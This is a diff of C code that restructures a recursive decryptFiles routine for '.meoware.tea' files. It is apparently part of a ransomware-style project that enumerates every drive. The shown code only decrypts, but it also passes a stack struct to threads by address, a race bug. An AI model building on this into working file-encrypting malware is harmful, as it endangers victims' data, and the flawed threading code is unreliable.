@@ -194,48 +194,46 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
     char filePath[MAX_PATH];
     sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
 
-    int isBlacklisted = 0;
-    for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
-      if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
-        isBlacklisted = 1;
-        break;
-      }
-    }
-
-    if (!isBlacklisted) {
-      if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-        // recursive call for subfolders
-        decryptFiles(filePath, key);
-      } else {
-        // process individual files
-        if (strstr(fileName, ".meoware.tea") != NULL) {
-          printf("file: %s\n", filePath);
-          char decryptedFilePath[MAX_PATH];
-          sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
-          struct ThreadData threadData = { filePath, decryptedFilePath, key };
-
-          // start a new thread
-          threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
-          if (threadHandles[threadCount] == 0) {
-            printf("error creating thread: %d - %s\n", GetLastError(), strerror(GetLastError()));
-            return;
-          }
-
-          threadCount++;
-
-          // wait for threads to finish before processing the next file
-          if (threadCount == MAX_THREADS) {
-            WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);
-
-            // close thread handles
-            for (int i = 0; i < threadCount; i++) {
-              CloseHandle(threadHandles[i]);
-            }
-
-            threadCount = 0;
-          }
-          printf("file decrypt: %s OK!\n", filePath);
+    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+      // recursive call for subfolders
+      decryptFiles(filePath, key);
+    } else {
+      int isBlacklisted = 0;
+      for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
+        if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
+          isBlacklisted = 1;
+          break;
         }
+      }
+
+      if (!isBlacklisted && strstr(fileName, ".meoware.tea") != NULL) {
+        // process individual files
+        printf("file: %s\n", filePath);
+        char decryptedFilePath[MAX_PATH];
+        sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
+        struct ThreadData threadData = { filePath, decryptedFilePath, key };
+
+        // start a new thread
+        threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
+        if (threadHandles[threadCount] == 0) {
+          printf("error creating thread: %d - %s\n", GetLastError(), strerror(GetLastError()));
+          return;
+        }
+
+        threadCount++;
+
+        // wait for threads to finish before processing the next file
+        if (threadCount == MAX_THREADS) {
+          WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);
+
+          // close thread handles
+          for (int i = 0; i < threadCount; i++) {
+            CloseHandle(threadHandles[i]);
+          }
+
+          threadCount = 0;
+        }
+        printf("file decrypt: %s OK!\n", filePath);
       }
     }
 
@@ -251,6 +249,7 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
 
   FindClose(hFind);
 }
+
 
 void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
   DWORD drives = GetLogicalDrives();
